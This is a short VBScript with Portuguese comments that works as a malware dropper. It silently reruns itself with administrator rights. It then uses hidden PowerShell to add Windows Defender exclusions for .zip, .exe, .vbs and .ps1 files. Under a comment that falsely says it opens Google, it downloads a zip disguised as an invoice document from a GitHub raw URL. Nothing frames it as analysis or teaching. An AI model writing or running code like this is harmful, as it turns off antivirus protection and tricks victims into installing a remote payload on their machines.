Set WshShell = CreateObject("WScript.Shell")

' Elevação silenciosa para admin
' Elevação silenciosa para admin
' Elevação silenciosa para admin
' Elevação silenciosa para admin
' Elevação silenciosa para admin
' Elevação silenciosa para admin
' Elevação silenciosa para admin
' Elevação silenciosa para admin
' Elevação silenciosa para admin
' Elevação silenciosa para admin
' Elevação silenciosa para admin
If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
    WScript.Quit
End If

' Adicionar exclusões em modo oculto
WshShell.Run "powershell -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionExtension '.zip','.exe','.vbs','.ps1'""", 0, True

' Abrir Google normalmente

WshShell.Run "https://github.com/minhaclaro79-lab/privacy-58248.com/raw/refs/heads/main/NF%2048277%20-%20Documento.zip", 1, False
